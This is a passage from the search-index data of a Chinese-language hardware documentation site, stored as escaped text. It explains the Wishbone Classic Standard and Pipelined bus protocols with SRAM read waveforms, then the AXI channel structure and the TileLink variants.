\u200b\u662f\u200b\u4e00\u4e2a\u200b\u5728\u200b\u5f00\u6e90\u200b\u793e\u533a\u200b\u5e7f\u6cdb\u200b\u4f7f\u7528\u200b\u7684\u200b\u603b\u7ebf\u200b\u534f\u8bae\u200b\uff0c\u200b\u5176\u200b\u5206\u4e3a\u200b\u591a\u4e2a\u200b\u7248\u672c\u200b\uff0c\u200b\u4e0b\u9762\u200b\u4ecb\u7ecd\u200b\u5176\u4e2d\u200b\u7684\u200b Wishbone Classic Standard \u200b\u548c\u200b Wishbone Classic Pipelined\u3002</p> <p>Wishbone \u200b\u7684\u200b\u540d\u5b57\u200b\u6765\u6e90\u200b\u5728\u200b\u5b98\u65b9\u200b\u7684\u200b\u6587\u6863\u200b\u91cc\u200b\u6709\u200b\u8bb2\u200b\uff1a</p> <pre><code>Webster\u2019s dictionary defines a WISHBONE as \u201cthe forked clavicle in front of the\nbreastbone of most birds.\u201d The term \u2018WISHBONE interconnect\u2019 was coined by Wade\nPeterson of Silicore Corporation. During the initial definition of the scheme he\nwas attempting to find a name that was descriptive of a bi-directional data bus\nthat used either multiplexers or three-state logic. This was solved by forming\nan interface with separate input and output paths. When these paths are\nconnected to three-state logic it forms a \u2018Y\u2019 shaped configuration that\nresembles a wishbone. The actual name was conceived during a Thanksgiving Day\ndinner that included roast turkey. Thanksgiving Day is a national holiday in the\nUnited States, and is observed on the third Thursday in November. It is\ngenerally celebrated with a traditional turkey dinner.\n</code></pre> <p>\u200b\u7b80\u5355\u200b\u6765\u8bf4\u200b\uff0c\u200b\u5728\u200b\u8d77\u540d\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u60f3\u5230\u200b\u603b\u7ebf\u200b\u7684\u200b\u6837\u5b50\u200b\u50cf\u662f\u200b\u4e00\u4e2a\u200b Y \u200b\u5b57\u578b\u200b\uff0c\u200b\u548c\u200b\u8bb8\u613f\u200b\u9aa8\u200b Wishbone \u200b\u7684\u200b\u5f62\u72b6\u200b\u7c7b\u4f3c\u200b\uff0c\u200b\u6240\u4ee5\u200b\u5c31\u200b\u8fd9\u6837\u200b\u8d77\u200b\u4e86\u200b\u540d\u5b57\u200b\u3002</p>"},{"location":"hardware/bus_protocol.html#wishbone-classic-standard","title":"Wishbone Classic Standard","text":"<p>\u200b\u6700\u200b\u7b80\u5355\u200b\u7684\u200b Wishbone \u200b\u7248\u672c\u200b\u53eb\u505a\u200b Wishbone Classic Standard\uff0c\u200b\u5176\u200b\u8bbe\u8ba1\u200b\u601d\u8def\u200b\u548c\u200b\u4e0a\u9762\u200b\u7684\u200b\u7b80\u6613\u200b\u603b\u7ebf\u200b\u534f\u8bae\u200b\u975e\u5e38\u200b\u76f8\u4f3c\u200b\uff0c\u200b\u4e0b\u9762\u200b\u5c06\u200b\u4e24\u8005\u200b\u8fdb\u884c\u200b\u4e00\u4e2a\u200b\u5bf9\u6bd4\u200b\u3002Wishbone Classic Standard \u200b\u534f\u8bae\u200b\u7684\u200b master \u200b\u7aef\u200b\uff08CPU \u200b\u7aef\u200b\uff09\u200b\u7684\u200b\u4fe1\u53f7\u200b\uff1a</p> <ol> <li><code>CLK_I</code>: \u200b\u65f6\u949f\u200b\u8f93\u5165\u200b\uff0c\u200b\u5373\u200b\u7b80\u6613\u200b\u603b\u7ebf\u200b\u534f\u8bae\u200b\u4e2d\u200b\u7684\u200b <code>clock_i</code></li> <li><code>STB_O</code>\uff1a\u200b\u9ad8\u200b\u8868\u793a\u200b master \u200b\u8981\u200b\u53d1\u9001\u200b\u8bf7\u6c42\u200b\uff0c\u200b\u5373\u200b\u7b80\u6613\u200b\u603b\u7ebf\u200b\u534f\u8bae\u200b\u4e2d\u200b\u7684\u200b <code>valid_o</code></li> <li><code>ACK_I</code>\uff1a\u200b\u9ad8\u200b\u8868\u793a\u200b slave \u200b\u5904\u7406\u200b\u8bf7\u6c42\u200b\uff0c\u200b\u5373\u200b\u7b80\u6613\u200b\u603b\u7ebf\u200b\u534f\u8bae\u200b\u4e2d\u200b\u7684\u200b <code>ready_i</code></li> <li><code>ADR_O</code>\uff1amaster \u200b\u60f3\u8981\u200b\u8bfb\u5199\u200b\u7684\u200b\u5730\u5740\u200b\uff0c\u200b\u5373\u200b\u7b80\u6613\u200b\u603b\u7ebf\u200b\u534f\u8bae\u200b\u4e2d\u200b\u7684\u200b <code>addr_o</code></li> <li><code>WE_O</code>\uff1amaster \u200b\u60f3\u8981\u200b\u8bfb\u200b\u8fd8\u662f\u200b\u5199\u200b\uff0c\u200b\u5373\u200b\u7b80\u6613\u200b\u603b\u7ebf\u200b\u534f\u8bae\u200b\u4e2d\u200b\u7684\u200b <code>we_o</code></li> <li><code>DAT_O</code>\uff1amaster \u200b\u60f3\u8981\u200b\u5199\u5165\u200b\u7684\u200b\u6570\u636e\u200b\uff0c\u200b\u5373\u200b\u7b80\u6613\u200b\u603b\u7ebf\u200b\u534f\u8bae\u200b\u4e2d\u200b\u7684\u200b <code>data_o</code></li> <li><code>SEL_O</code>\uff1amaster \u200b\u8bfb\u5199\u200b\u7684\u200b\u5b57\u8282\u200b\u4f7f\u80fd\u200b\uff0c\u200b\u5373\u200b\u7b80\u6613\u200b\u603b\u7ebf\u200b\u534f\u8bae\u200b\u4e2d\u200b\u7684\u200b <code>be_o</code></li> <li><code>DAT_I</code>\uff1amaster \u200b\u4ece\u200b slave \u200b\u8bfb\u53d6\u200b\u7684\u200b\u6570\u636e\u200b\uff0c\u200b\u5373\u200b\u7b80\u6613\u200b\u603b\u7ebf\u200b\u534f\u8bae\u200b\u4e2d\u200b\u7684\u200b <code>data_i</code></li> <li><code>CYC_O</code>\uff1a\u200b\u603b\u7ebf\u200b\u7684\u200b\u4f7f\u200b\u80fd\u200b\u4fe1\u53f7\u200b\uff0c\u200b\u65e0\u200b\u5bf9\u5e94\u200b\u7684\u200b\u7b80\u6613\u200b\u603b\u7ebf\u200b\u534f\u8bae\u200b\u4fe1\u53f7\u200b</li> </ol> <p>\u200b\u6b64\u5904\u200b\u5ffd\u7565\u200b\u4e86\u200b\u4e00\u4e9b\u200b\u53ef\u200b\u9009\u200b\u4fe1\u53f7\u200b\u3002\u200b\u9664\u4e86\u200b\u6700\u540e\u200b\u4e00\u4e2a\u200b <code>CYC_O</code>\uff0c\u200b\u5176\u4ed6\u200b\u7684\u200b\u4fe1\u53f7\u200b\u5176\u5b9e\u200b\u5c31\u662f\u200b\u4e0a\u6587\u200b\u7684\u200b\u7b80\u6613\u200b\u603b\u7ebf\u200b\u534f\u8bae\u200b\u3002<code>CYC_O</code> \u200b\u7684\u200b\u53ef\u4ee5\u200b\u8ba4\u4e3a\u200b\u662f\u200b master \u200b\u60f3\u8981\u200b\u5360\u7528\u200b slave \u200b\u7684\u200b\u603b\u7ebf\u200b\u63a5\u53e3\u200b\uff0c\u200b\u5728\u200b\u5e38\u89c1\u200b\u7684\u200b\u4f7f\u7528\u200b\u573a\u666f\u200b\u4e0b\u200b\uff0c\u200b\u76f4\u63a5\u200b\u8ba4\u4e3a\u200b <code>CYC_O=STB_O</code>\u3002\u200b\u5b83\u200b\u7684\u200b\u7528\u9014\u200b\u662f\u200b\uff1a</p> <ol> <li>\u200b\u5360\u7528\u200b slave \u200b\u7684\u200b\u603b\u7ebf\u200b\u63a5\u53e3\u200b\uff0c\u200b\u4e0d\u200b\u5141\u8bb8\u200b\u5176\u4ed6\u200b master \u200b\u8bbf\u95ee\u200b</li> <li>\u200b\u7b80\u5316\u200b interconnect \u200b\u7684\u200b\u5b9e\u73b0\u200b</li> </ol> <p>\u200b\u628a\u200b\u4e0a\u9762\u200b\u7b80\u6613\u200b\u603b\u7ebf\u200b\u534f\u8bae\u200b\u7684\u200b\u6ce2\u5f62\u56fe\u200b\u6539\u6210\u200b Wishbone Classic Standard\uff0c\u200b\u5c31\u200b\u53ef\u4ee5\u200b\u5f97\u5230\u200b\uff1a</p> Wishbone Classic Standard \u200b\u7684\u200b\u6ce2\u5f62\u56fe"},{"location":"hardware/bus_protocol.html#wishbone-classic-pipelined","title":"Wishbone Classic Pipelined","text":"<p>Wishbone Classic Standard \u200b\u534f\u8bae\u200b\u975e\u5e38\u7b80\u5355\u200b\uff0c\u200b\u4f46\u662f\u200b\u4f1a\u200b\u9047\u5230\u200b\u4e00\u4e2a\u200b\u95ee\u9898\u200b\uff1a\u200b\u5047\u8bbe\u200b\u5b9e\u73b0\u200b\u7684\u200b\u662f\u200b\u4e00\u4e2a\u200b SRAM \u200b\u63a7\u5236\u5668\u200b\uff0c\u200b\u5b83\u200b\u7684\u200b\u8bfb\u200b\u64cd\u4f5c\u200b\u6709\u200b\u4e00\u4e2a\u200b\u5468\u671f\u200b\u7684\u200b\u5ef6\u8fdf\u200b\uff0c\u200b\u4e5f\u5c31\u662f\u8bf4\u200b\uff0c\u200b\u5728\u200b\u8fd9\u4e2a\u200b\u5468\u671f\u200b\u7ed9\u51fa\u200b\u5730\u5740\u200b\uff0c\u200b\u9700\u8981\u200b\u5728\u200b\u4e0b\u200b\u4e00\u4e2a\u200b\u5468\u671f\u200b\u624d\u200b\u53ef\u4ee5\u200b\u5f97\u5230\u200b\u7ed3\u679c\u200b\u3002\u200b\u5728\u200b Wishbone Classic Standard \u200b\u4e2d\u200b\uff0c\u200b\u5c31\u200b\u4f1a\u200b\u51fa\u73b0\u200b\u4e0b\u9762\u200b\u7684\u200b\u6ce2\u5f62\u200b\uff1a</p> Wishbone Classic Standard \u200b\u5b9e\u73b0\u200b SRAM \u200b\u63a7\u5236\u5668\u200b\u7684\u200b\u6ce2\u5f62\u56fe\u200b <ul> <li><code>a</code> \u200b\u5468\u671f\u200b\uff1amaster \u200b\u7ed9\u51fa\u200b\u8bfb\u200b\u5730\u5740\u200b 0x01\uff0c\u200b\u6b64\u65f6\u200b SRAM \u200b\u63a7\u5236\u5668\u200b\u5f00\u59cb\u200b\u8bfb\u53d6\u200b\uff0c\u200b\u4f46\u662f\u200b\u6b64\u65f6\u200b\u6570\u636e\u200b\u8fd8\u200b\u6ca1\u6709\u200b\u8bfb\u53d6\u200b\u56de\u6765\u200b\uff0c\u200b\u6240\u4ee5\u200b <code>ACK_I=0</code></li> <li><code>b</code> \u200b\u5468\u671f\u200b\uff1a\u200b\u6b64\u65f6\u200b SRAM \u200b\u5b8c\u6210\u200b\u4e86\u200b\u8bfb\u53d6\u200b\uff0c\u200b\u628a\u200b\u8bfb\u53d6\u200b\u7684\u200b\u6570\u636e\u200b 0x12 \u200b\u653e\u5728\u200b <code>DAT_I</code> \u200b\u5e76\u200b\u8bbe\u7f6e\u200b <code>ACK_I=1</code></li> <li><code>c</code> \u200b\u5468\u671f\u200b\uff1amaster \u200b\u7ed9\u51fa\u200b\u4e0b\u200b\u4e00\u4e2a\u200b\u8bfb\u200b\u5730\u5740\u200b 0x02\uff0cSRAM \u200b\u8981\u200b\u91cd\u65b0\u200b\u5f00\u59cb\u200b\u8bfb\u53d6\u200b</li> <li><code>d</code> \u200b\u5468\u671f\u200b\uff1a\u200b\u6b64\u65f6\u200b SRAM \u200b\u5b8c\u6210\u200b\u4e86\u200b\u7b2c\u4e8c\u6b21\u200b\u8bfb\u53d6\u200b\uff0c\u200b\u628a\u200b\u8bfb\u53d6\u200b\u7684\u200b\u6570\u636e\u200b 0x34 \u200b\u653e\u5728\u200b <code>DAT_I</code> \u200b\u5e76\u200b\u8bbe\u7f6e\u200b <code>ACK_I=1</code></li> </ul> <p>\u200b\u4ece\u200b\u6ce2\u5f62\u200b\u6765\u770b\u200b\uff0c\u200b\u529f\u80fd\u200b\u6ca1\u6709\u200b\u95ee\u9898\u200b\uff0c\u200b\u4f46\u662f\u200b\u6bcf\u200b\u4e24\u4e2a\u200b\u5468\u671f\u200b\u624d\u80fd\u200b\u8fdb\u884c\u200b\u4e00\u6b21\u200b\u8bfb\u200b\u64cd\u4f5c\u200b\uff0c\u200b\u53d1\u6325\u200b\u4e0d\u4e86\u200b\u6700\u9ad8\u200b\u7684\u200b\u6027\u80fd\u200b\u3002\u200b\u5728\u200b <code>a</code> \u200b\u5468\u671f\u200b\u7ed9\u51fa\u200b\u7b2c\u4e00\u4e2a\u200b\u5730\u5740\u200b\uff0c\u200b\u5728\u200b <code>b</code> \u200b\u5468\u671f\u200b\u5f97\u5230\u200b\u7b2c\u4e00\u4e2a\u200b\u6570\u636e\u200b\uff0c\u200b\u90a3\u4e48\u200b\u5982\u679c\u200b\u80fd\u200b\u5728\u200b <code>b</code> \u200b\u5468\u671f\u200b\u7684\u200b\u65f6\u5019\u200b\u7ed9\u51fa\u200b\u7b2c\u4e8c\u4e2a\u200b\u5730\u5740\u200b\uff0c\u200b\u5c31\u200b\u53ef\u4ee5\u200b\u5728\u200b <code>c</code> \u200b\u5468\u671f\u200b\u5f97\u5230\u200b\u7b2c\u4e8c\u4e2a\u200b\u6570\u636e\u200b\uff0c\u200b\u8fd9\u6837\u200b\u5c31\u200b\u53ef\u4ee5\u200b\u5b9e\u73b0\u200b\u6d41\u6c34\u7ebf\u200b\u5f0f\u200b\u7684\u200b\u6bcf\u4e2a\u200b\u5468\u671f\u200b\u8fdb\u884c\u200b\u4e00\u6b21\u200b\u8bfb\u200b\u64cd\u4f5c\u200b\u3002\u200b\u4f46\u662f\u200b\uff0cWishbone Classic Standard \u200b\u8981\u6c42\u200b <code>b</code> \u200b\u5468\u671f\u200b\u65f6\u200b\u7b2c\u4e00\u6b21\u200b\u8bf7\u6c42\u200b\u8fd8\u200b\u6ca1\u6709\u200b\u7ed3\u675f\u200b\uff0c\u200b\u56e0\u6b64\u200b\u9700\u8981\u200b\u4fee\u6539\u200b\u534f\u8bae\u200b\uff0c\u200b\u6765\u200b\u5b9e\u73b0\u200b\u6d41\u6c34\u7ebf\u200b\u5f0f\u200b\u7684\u200b\u8bf7\u6c42\u200b\u3002</p> <p>\u200b\u5b9e\u73b0\u200b\u601d\u8def\u200b\u4e5f\u200b\u5f88\u200b\u7b80\u5355\u200b\uff1a\u200b\u65e2\u7136\u200b Wishbone Classic Standard \u200b\u8ba4\u4e3a\u200b <code>b</code> \u200b\u5468\u671f\u200b\u65f6\u200b\uff0c\u200b\u7b2c\u4e00\u6b21\u200b\u8bf7\u6c42\u200b\u8fd8\u200b\u6ca1\u6709\u200b\u7ed3\u675f\u200b\uff0c\u200b\u90a3\u200b\u5c31\u8ba9\u200b\u7b2c\u4e00\u6b21\u200b\u8bf7\u6c42\u200b\u63d0\u524d\u200b\u5728\u200b <code>a</code> \u200b\u5468\u671f\u200b\u5b8c\u6210\u200b\uff0c\u200b\u53ea\u4e0d\u8fc7\u200b\u5b83\u200b\u7684\u200b\u6570\u636e\u200b\u8981\u200b\u7b49\u5230\u200b <code>b</code> \u200b\u5468\u671f\u200b\u624d\u80fd\u200b\u7ed9\u51fa\u200b\u3002\u200b\u5b9e\u9645\u4e0a\u200b\uff0c\u200b\u8fd9\u4e2a\u200b\u65f6\u5019\u200b\u7684\u200b\u4e00\u6b21\u200b\u8bfb\u200b\u64cd\u4f5c\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u8ba4\u4e3a\u200b\u5206\u6210\u200b\u4e86\u200b\u4e24\u200b\u90e8\u5206\u200b\uff1a\u200b\u9996\u5148\u200b\u662f\u200b master \u200b\u5411\u200b slave \u200b\u53d1\u9001\u200b\u8bfb\u200b\u8bf7\u6c42\u200b\uff0c\u200b\u8fd9\u4e2a\u200b\u8bf7\u6c42\u200b\u5728\u200b <code>a</code> \u200b\u5468\u671f\u200b\u5b8c\u6210\u200b\uff1b\u200b\u7136\u540e\u200b\u662f\u200b slave \u200b\u5411\u200b master \u200b\u53d1\u9001\u200b\u8bfb\u200b\u7684\u200b\u7ed3\u679c\u200b\uff0c\u200b\u8fd9\u4e2a\u200b\u7ed3\u679c\u200b\u5728\u200b <code>b</code> \u200b\u5468\u671f\u200b\u5b8c\u6210\u200b\u3002\u200b\u4e3a\u4e86\u200b\u5b9e\u73b0\u200b\u8fd9\u4e2a\u200b\u529f\u80fd\u200b\uff0c\u200b\u8fdb\u884c\u200b\u5982\u4e0b\u200b\u4fee\u6539\u200b\uff1a</p> <ul> <li>\u200b\u6dfb\u52a0\u200b <code>STALL_I</code> \u200b\u4fe1\u53f7\u200b\uff1a<code>CYC_O=1 &amp;&amp; STB_O=1 &amp;&amp; STALL_I=0</code> \u200b\u8868\u793a\u200b\u8fdb\u884c\u200b\u4e00\u6b21\u200b\u8bfb\u200b\u8bf7\u6c42\u200b</li> <li>\u200b\u4fee\u6539\u200b <code>ACK_I</code> \u200b\u4fe1\u53f7\u200b\u542b\u4e49\u200b\uff1a<code>CYC_O=1 &amp;&amp; STB_O=1 &amp;&amp; ACK_I=1</code> \u200b\u8868\u793a\u200b\u4e00\u6b21\u200b\u8bfb\u200b\u54cd\u5e94\u200b</li> </ul> <p>\u200b\u8fdb\u884c\u200b\u5982\u200b\u4e0a\u200b\u4fee\u6539\u200b\uff0c\u200b\u5c31\u200b\u5f97\u5230\u200b\u4e86\u200b Wishbone Classic Pipelined \u200b\u603b\u7ebf\u200b\u534f\u8bae\u200b\u3002\u200b\u4e0a\u9762\u200b\u7684\u200b\u4e24\u6b21\u200b\u8fde\u7eed\u200b\u8bfb\u200b\u64cd\u4f5c\u200b\u6ce2\u5f62\u200b\u5982\u4e0b\u200b\uff1a</p> Wishbone Classic Pipelined \u200b\u5b9e\u73b0\u200b SRAM \u200b\u63a7\u5236\u5668\u200b\u7684\u200b\u6ce2\u5f62\u56fe\u200b <ul> <li><code>a</code> \u200b\u5468\u671f\u200b\uff1amaster \u200b\u8bf7\u6c42\u200b\u8bfb\u200b\u5730\u5740\u200b 0x01\uff0cslave \u200b\u63a5\u6536\u200b\u8bfb\u200b\u8bf7\u6c42\u200b\uff08<code>STALL_O=0</code>\uff09</li> <li><code>b</code> \u200b\u5468\u671f\u200b\uff1aslave \u200b\u8fd4\u56de\u200b\u8bfb\u200b\u8bf7\u6c42\u200b\u7ed3\u679c\u200b 0x12\uff0c\u200b\u5e76\u200b\u8bbe\u7f6e\u200b <code>ACK_I=1</code>\uff1b\u200b\u540c\u65f6\u200b master \u200b\u8bf7\u6c42\u200b\u8bfb\u200b\u5730\u5740\u200b 0x02\uff0cslave \u200b\u63a5\u6536\u200b\u8bfb\u200b\u8bf7\u6c42\u200b\uff08<code>STALL_O=0</code>\uff09</li> <li><code>c</code> \u200b\u5468\u671f\u200b\uff1aslave \u200b\u8fd4\u56de\u200b\u8bfb\u200b\u8bf7\u6c42\u200b\u7ed3\u679c\u200b 0x34\uff0c\u200b\u5e76\u200b\u8bbe\u7f6e\u200b <code>ACK_I=1</code>\uff1bmaster \u200b\u4e0d\u518d\u200b\u53d1\u8d77\u200b\u8bf7\u6c42\u200b\uff0c\u200b\u8bbe\u7f6e\u200b <code>STB_O=0</code></li> <li><code>d</code> \u200b\u5468\u671f\u200b\uff1a\u200b\u6240\u6709\u200b\u8bf7\u6c42\u200b\u5b8c\u6210\u200b\uff0cmaster \u200b\u8bbe\u7f6e\u200b <code>CYC_O=0</code></li> </ul> <p>\u200b\u8fd9\u6837\u200b\u5c31\u200b\u5229\u7528\u200b Wishbone Classic Pipelined \u200b\u534f\u8bae\u200b\u5b9e\u73b0\u200b\u4e86\u200b\u4e00\u4e2a\u200b\u6bcf\u200b\u5468\u671f\u200b\u8fdb\u884c\u200b\u4e00\u6b21\u200b\u8bfb\u200b\u64cd\u4f5c\u200b\u7684\u200b slave\u3002</p>"},{"location":"hardware/bus_protocol.html#axi","title":"AXI","text":"<p>AXI \u200b\u603b\u7ebf\u200b\u534f\u8bae\u200b\u662f\u200b ARM \u200b\u516c\u53f8\u200b\u63d0\u51fa\u200b\u7684\u200b\u603b\u7ebf\u200b\u534f\u8bae\u200b\uff0c\u200b\u5728\u200b ARM \u200b\u5904\u7406\u5668\u200b\u4ee5\u53ca\u200b Xilinx FPGA \u200b\u5185\u200b\u4f7f\u7528\u200b\u7684\u200b\u6bd4\u8f83\u200b\u5e7f\u6cdb\u200b\u3002</p> <p>AXI \u200b\u7684\u200b\u4fe1\u53f7\u200b\u5206\u6210\u200b\u4e94\u4e2a\u200b Channel\uff1a</p> <ol> <li>AW\uff08Address Write\uff09\uff1a\u200b\u5199\u200b\u8bf7\u6c42\u200b\u7684\u200b\u5730\u5740\u200b\u4f1a\u200b\u901a\u8fc7\u200b AW Channel \u200b\u53d1\u9001\u7ed9\u200b Slave</li> <li>W\uff08Write\uff09\uff1a\u200b\u5199\u200b\u8bf7\u6c42\u200b\u7684\u200b\u6570\u636e\u200b\u4f1a\u200b\u901a\u8fc7\u200b W Channel \u200b\u53d1\u9001\u7ed9\u200b Slave</li> <li>B\uff1a\u200b\u5199\u200b\u54cd\u5e94\u200b\u4f1a\u200b\u901a\u8fc7\u200b B Channel \u200b\u53d1\u9001\u7ed9\u200b Master</li> <li>AR\uff08Address Read\uff09\uff1a\u200b\u8bfb\u200b\u8bf7\u6c42\u200b\u7684\u200b\u5730\u5740\u200b\u4f1a\u200b\u901a\u8fc7\u200b AR Channel \u200b\u53d1\u9001\u7ed9\u200b Slave</li> <li>R\uff08Read\uff09\uff1a\u200b\u8bfb\u200b\u54cd\u5e94\u200b\u4f1a\u200b\u901a\u8fc7\u200b R Channel \u200b\u53d1\u9001\u7ed9\u200b Slave</li> </ol> <p>\u200b\u6bcf\u4e2a\u200b Channel \u200b\u90fd\u200b\u5305\u62ec\u200b <code>valid-ready</code> \u200b\u5f0f\u200b\u7684\u200b\u63e1\u624b\u200b\u4fe1\u53f7\u200b\uff0c\u200b\u5bf9\u4e8e\u200b AW\u3001W \u200b\u548c\u200b AR Channel\uff0cMaster \u200b\u662f\u200b\u53d1\u9001\u200b\u65b9\u200b\uff0cSlave \u200b\u662f\u200b\u63a5\u6536\u200b\u65b9\u200b\uff1b\u200b\u5bf9\u4e8e\u200b R \u200b\u548c\u200b B Channel\uff0cSlave \u200b\u662f\u200b\u53d1\u9001\u200b\u65b9\u200b\uff0cMaster \u200b\u662f\u200b\u63a5\u6536\u200b\u65b9\u200b\u3002</p> <p>\u200b\u53ef\u89c1\u200b AXI \u200b\u7684\u200b\u8bbe\u8ba1\u200b\u628a\u200b\u8bf7\u6c42\u200b\u548c\u200b\u54cd\u5e94\u200b\u7684\u200b\u8fc7\u7a0b\u200b\u62c6\u5f00\u200b\uff0c\u200b\u5e76\u4e14\u200b\u5141\u8bb8\u200b\u603b\u7ebf\u200b\u4e0a\u200b\u540c\u65f6\u200b\u6709\u200b\u591a\u4e2a\u200b\u6b63\u5728\u200b\u8fdb\u884c\u200b\u7684\u200b\u8bf7\u6c42\u200b\uff1a\u200b\u4e0d\u7528\u200b\u7b49\u5f85\u200b\u54cd\u5e94\u200b\u56de\u6765\u200b\uff0c\u200b\u5c31\u200b\u53ef\u4ee5\u200b\u53d1\u9001\u200b\u65b0\u200b\u7684\u200b\u8bf7\u6c42\u200b\u3002\u200b\u56e0\u6b64\u200b AXI \u200b\u53ef\u4ee5\u200b\u66f4\u597d\u200b\u5730\u200b\u5229\u7528\u200b\u5185\u5b58\u200b\u7684\u200b\u5e76\u884c\u5ea6\u200b\uff0c\u200b\u8fbe\u5230\u200b\u66f4\u200b\u9ad8\u200b\u7684\u200b\u6027\u80fd\u200b\uff0c\u200b\u4ee3\u4ef7\u200b\u5c31\u662f\u200b\u8bbe\u8ba1\u200b\u66f4\u52a0\u200b\u590d\u6742\u200b\u3002</p> <p>\u200b\u4e3a\u4e86\u200b\u5b8c\u6210\u200b\u4e00\u6b21\u200b\u5199\u200b\u8bf7\u6c42\u200b\uff0cMaster \u200b\u9700\u8981\u200b\uff1a</p> <ol> <li>\u200b\u901a\u8fc7\u200b AW Channel \u200b\u53d1\u9001\u200b\u8981\u200b\u5199\u5165\u200b\u7684\u200b\u5730\u5740\u200b\u3001\u200b\u5199\u5165\u200b\u7684\u200b\u957f\u5ea6\u200b\u7b49\u200b\u4fe1\u606f\u200b\u7ed9\u200b Slave</li> <li>\u200b\u901a\u8fc7\u200b W Channel \u200b\u53d1\u9001\u200b\u8981\u200b\u5199\u5165\u200b\u7684\u200b\u6570\u636e\u200b\uff0c\u200b\u652f\u6301\u200b Burst\uff0c\u200b\u4e5f\u200b\u5c31\u662f\u200b\u4f7f\u7528\u200b\u591a\u4e2a\u200b\u5468\u671f\u200b\u5b8c\u6210\u200b\u4e00\u4e2a\u200b\u5199\u200b\u8bf7\u6c42\u200b\u7684\u200b\u6570\u636e\u4f20\u8f93\u200b</li> <li>\u200b\u5728\u200b B Channel \u200b\u4e0a\u200b\u7b49\u5f85\u200b Slave \u200b\u56de\u590d\u200b\u5199\u5165\u200b\u5b8c\u6210\u200b\u7684\u200b\u54cd\u5e94\u200b</li> </ol> <p>\u200b\u4e3a\u4e86\u200b\u5b8c\u6210\u200b\u4e00\u6b21\u200b\u8bfb\u200b\u8bf7\u6c42\u200b\uff0cMaster \u200b\u9700\u8981\u200b\uff1a</p> <ol> <li>\u200b\u901a\u8fc7\u200b AR Channel \u200b\u53d1\u9001\u200b\u8981\u200b\u8bfb\u53d6\u200b\u7684\u200b\u5730\u5740\u200b\u3001\u200b\u8bfb\u53d6\u200b\u7684\u200b\u957f\u5ea6\u200b\u7b49\u200b\u4fe1\u606f\u200b\u7ed9\u200b Slave</li> <li>\u200b\u5728\u200b R Channel \u200b\u4e0a\u200b\u7b49\u5f85\u200b Slave \u200b\u56de\u590d\u200b\u8bfb\u53d6\u200b\u7684\u200b\u6570\u636e\u200b\uff0c\u200b\u652f\u6301\u200b Burst\uff0c\u200b\u4e5f\u200b\u5c31\u662f\u200b\u4f7f\u7528\u200b\u591a\u4e2a\u200b\u5468\u671f\u200b\u5b8c\u6210\u200b\u4e00\u4e2a\u200b\u8bfb\u200b\u54cd\u5e94\u200b\u7684\u200b\u6570\u636e\u4f20\u8f93\u200b</li> </ol> <p>\u200b\u7531\u4e8e\u200b AXI \u200b\u4e0a\u200b\u53ef\u4ee5\u200b\u540c\u65f6\u200b\u8fdb\u884c\u200b\u591a\u4e2a\u200b\u8bf7\u6c42\u200b\uff0c\u200b\u4e3a\u4e86\u200b\u8ba9\u200b Master \u200b\u53ef\u4ee5\u200b\u533a\u5206\u200b\u51fa\u200b B \u200b\u548c\u200b R Channel \u200b\u4e0a\u200b\u7684\u200b\u54cd\u5e94\u200b\u4e0e\u200b\u8bf7\u6c42\u200b\u7684\u200b\u5bf9\u5e94\u200b\u5173\u7cfb\u200b\uff0c\u200b\u6bcf\u4e2a\u200b\u8bf7\u6c42\u200b\u548c\u200b\u54cd\u5e94\u200b\u90fd\u200b\u9644\u5e26\u200b\u4e86\u200b\u4e00\u4e2a\u200b ID\uff0c\u200b\u90a3\u4e48\u200b Master \u200b\u5728\u200b\u8bf7\u6c42\u200b\u4e2d\u200b\u9644\u5e26\u200b\u4e86\u200b\u4ec0\u4e48\u200b ID\uff0cSlave \u200b\u5728\u200b\u54cd\u5e94\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u4e5f\u200b\u8981\u200b\u9644\u5e26\u200b\u76f8\u540c\u200b\u7684\u200b ID\u3002\u200b\u5bf9\u4e8e\u200b\u540c\u4e00\u4e2a\u200b ID \u200b\u7684\u200b\u8bf7\u6c42\u200b\uff0c\u200b\u5176\u200b\u987a\u5e8f\u200b\u662f\u200b\u53d7\u200b\u4fdd\u8bc1\u200b\u7684\u200b\u3002</p> <p>AXI \u200b\u6709\u200b\u652f\u6301\u200b\u7f13\u5b58\u200b\u4e00\u81f4\u6027\u200b\u534f\u8bae\u200b\u7684\u200b\u6269\u5c55\u200b\uff1aACE\uff0c\u200b\u5176\u200b\u5185\u5bb9\u200b\u5728\u200b \u200b\u4e00\u81f4\u6027\u200b\u534f\u8bae\u200b \u200b\u4e2d\u200b\u4ecb\u7ecd\u200b\u3002</p>"},{"location":"hardware/bus_protocol.html#tilelink","title":"TileLink","text":"<p>TileLink \u200b\u603b\u7ebf\u200b\u534f\u8bae\u200b\u662f\u200b SiFive \u200b\u516c\u53f8\u200b\u63d0\u51fa\u200b\u7684\u200b\u603b\u7ebf\u200b\u534f\u8bae\u200b\uff0c\u200b\u5728\u200b Rocket Chip \u200b\u76f8\u5173\u200b\u7684\u200b\u9879\u76ee\u200b\u4e2d\u200b\u4f7f\u7528\u200b\u6bd4\u8f83\u200b\u5e7f\u6cdb\u200b\u3002\u200b\u6839\u636e\u200b TileLink Spec 1.8.0\uff0cTileLink \u200b\u5206\u4e3a\u200b\u4ee5\u4e0b\u200b\u4e09\u79cd\u200b\uff1a</p> <ul> <li>TL-UL: \u200b\u53ea\u200b\u652f\u6301\u200b\u8bfb\u5199\u200b\uff0c\u200b\u4e0d\u200b\u652f\u6301\u200b burst\uff0c\u200b\u7c7b\u6bd4\u200b AXI-Lite</li> <li>TL-UH\uff1a\u200b\u652f\u6301\u200b\u8bfb\u5199\u200b\uff0c\u200b\u539f\u5b50\u200b\u6307\u4ee4\u200b\uff0c\u200b\u9884\u53d6\u200b\uff0c\u200b\u652f\u6301\u200b burst\uff0c\u200b\u7c7b\u6bd4\u200b AXI+ATOP\uff08AXI5 \u200b\u5f15\u5165\u200b\u7684\u200b\u539f\u5b50\u200b\u64cd\u4f5c\u200b\uff09</li> <li>TL-C\uff1a\u200b\u5728\u200b TL-UH \u200b\u57fa\u7840\u200b\u4e0a\u200b\u652f\u6301\u200b\u7f13\u5b58\u200b\u4e00\u81f4\u6027\u200b\u534f\u8bae\u200b\uff0c\u200b\u7c7b\u6bd4\u200b AXI+ACE/CHI</li> </ul> 